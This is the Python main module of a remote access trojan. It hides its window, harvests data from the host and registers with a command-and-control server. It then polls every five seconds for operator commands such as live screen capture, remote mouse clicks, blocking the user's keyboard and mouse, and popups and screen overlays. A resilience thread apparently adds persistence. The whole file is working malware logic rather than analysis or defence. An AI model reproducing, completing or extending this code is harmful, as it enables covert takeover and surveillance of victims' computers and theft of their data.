import time
import threading
import socket
import traceback
import os
import tkinter as tk

# Import all modules
import actions
from harvester import harvest_all_data
from comms import register_with_c2, send_heartbeat, upload_rat_frame
from resilience import manage_resilience

ENABLE_RESILIENCE = True

def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command = task.get("command")
        print(f"[*] Received command: {command}")
        # Add new RAT and Block Input commands
        if command == "rat_start":
            actions.toggle_rat(upload_rat_frame)
        elif command == "rat_stop":
            actions.toggle_rat(None)
        elif command == "rat_click":
            actions.execute_mouse_click(task.get("x"), task.get("y"), task.get("button"))
        elif command == "block_input":
            # Run in a thread to not block the main loop
            threading.Thread(target=actions.block_user_input, daemon=True).start()
        elif command == "show_popup":
            actions.show_popup(task.get("text", "Default Popup"))
        elif command == "toggle_noise":
            actions.toggle_noise()
        elif command == "toggle_overlay":
            actions.toggle_screen_overlay()

def payload_logic_thread():
    try:
        if ENABLE_RESILIENCE:
            threading.Thread(target=manage_resilience, daemon=True).start()
        hostname = socket.gethostname()
        initial_data = harvest_all_data()
        register_with_c2(hostname, initial_data)
        while True:
            response = send_heartbeat()
            if response and "tasks" in response:
                process_tasks(response["tasks"])
            time.sleep(5) # Check in every 5 seconds for better RAT responsiveness
    except Exception:
        print(f"[!!!] Payload logic thread crashed:\n{traceback.format_exc()}")

if __name__ == "__main__":
    gui_root = tk.Tk()
    gui_root.withdraw()
    actions.init_gui(gui_root)
    c2_thread = threading.Thread(target=payload_logic_thread, daemon=True)
    c2_thread.start()
    gui_root.mainloop()